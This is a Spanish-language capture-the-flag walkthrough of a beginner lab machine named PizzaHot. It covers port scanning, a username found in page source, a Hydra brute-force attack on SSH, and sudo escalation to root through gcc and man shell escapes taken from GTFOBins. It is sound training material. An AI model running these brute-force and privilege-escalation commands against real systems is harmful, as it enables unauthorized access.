---
description: '🔍 Dificultad: Principiante'
---

# PizzaHot

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.41
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (12).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.41
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (26).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.41
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (738).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos la página de pizzas.

<figure><img src="../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>

Revisamos el código fuente y encontramos el nombre de un usuario llamado **pizzapiña**.

<figure><img src="../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l pizzapiña -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.41 -t 5
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **192.168.1.41**

<figure><img src="../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la contraseña de **pizzapiña**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh pizzapiña@192.168.1.41
```

<figure><img src="../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos permisos sudo con **gcc** por lo que miramos [GTFOBins ](https://gtfobins.github.io/gtfobins/gcc/)para ver como podemos escalar privilegios.

```bash
sudo -u pizzasinpiña gcc -wrapper /bin/sh,-s .
```

Realizar tratamiento de la TTY. Como se nos muestra aquí: [Tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/). &#x20;

<figure><img src="../../.gitbook/assets/image (743).png" alt=""><figcaption></figcaption></figure>

Ya estamos dentro del usuario **pizzasinpiña** por lo que realizamos otra vez el comando:

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/image (745).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos permisos sudo con **man** por lo que miramos [GTFOBins ](https://gtfobins.github.io/gtfobins/man/)para ver como podemos escalar privilegios.

```bash
sudo man man
```

Presionamos la tecla **ESC** para salir del modo de inserción en VIM y, a continuación, ejecutamos el siguiente comando para obtener una shell con privilegios elevados:

<figure><img src="../../.gitbook/assets/image (746).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (747).png" alt=""><figcaption></figcaption></figure>

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
